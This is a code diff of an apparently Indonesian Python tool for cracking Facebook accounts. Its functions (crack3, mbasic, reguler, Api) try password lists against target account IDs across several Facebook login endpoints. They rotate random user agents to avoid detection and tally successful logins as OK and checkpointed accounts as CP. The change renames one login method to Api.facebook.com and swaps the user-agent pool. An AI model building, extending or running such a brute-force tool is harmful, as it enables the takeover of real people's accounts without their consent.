@@ -1169,7 +1169,7 @@ def setting():
     else:
         print(' [+] Pilih Yang Bener Sayang ')
         exit()
-    Console().print(Panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Login Site [bold green]mbasic.facebook.com[bold white] [/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Login Site [bold green]validate.facebook.com[bold white]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Login Site [bold green]reguler.facebook.com[bold white] [/]',width=80,style=f"{color_panel}", title="[bold green] Method"))
+    Console().print(Panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Login Site [bold green]mbasic.facebook.com[bold white] [/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Login Site [bold green]Api.facebook.com[bold white]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Login Site [bold green]reguler.facebook.com[bold white] [/]',width=80,style=f"{color_panel}", title="[bold green] Method"))
     hc = console.input(f" {H2}• {P2}Masukan : ")
     if hc in ['1','01']:
         method.append('mbasic')
@@ -1259,7 +1259,7 @@ def crack3(idf,pwv):
     global loop,ok,cp
     prog.update(des,description=f" {K2}•{H2} MBASIC {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
     prog.advance(des)
-    ua = random.choice(uakucui)
+    ua = random.choice(free)
     ua2 = random.choice(free)
     ses = requests.Session()
     for pw in pwv:
@@ -1321,7 +1321,7 @@ def mbasic(idf,pwv):
 	AinkRaka = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
 	prog.update(des,description=f" {K2}•{H2} VALIDATE {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
 	prog.advance(des)
-	ua=random.choice(uakucui)
+	ua=random.choice(free)
 	ses = requests.Session()
 	for pw in pwv:
 		pw = pw.lower()
@@ -1356,7 +1356,7 @@ def reguler(idf,pwv):
 	rr = random.randint
 	prog.update(des,description=f" {K2}•{H2} REGULER {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
 	prog.advance(des)
-	ua=random.choice(uakucui)
+	ua=random.choice(free)
 	ses = requests.Session()
 	for pw in pwv:
 		pw = pw.lower()
@@ -1418,7 +1418,7 @@ def Api(idf,pwv):
     war = str(random.choice([H2,K2,B2,O2,]))
     prog.update(des,description=f"{H2}Crack Api {P2}OK-:{H2}{ok} {P2}CP-:{K2}{cp} {P2}- {war}{str(loop)}/{len(id2)}")
     prog.advance(des)
-    rudalxd = random.choice(uakucui)
+    rudalxd = random.choice(free)
     ses = requests.Session()
     for pw in pwv:
         try:
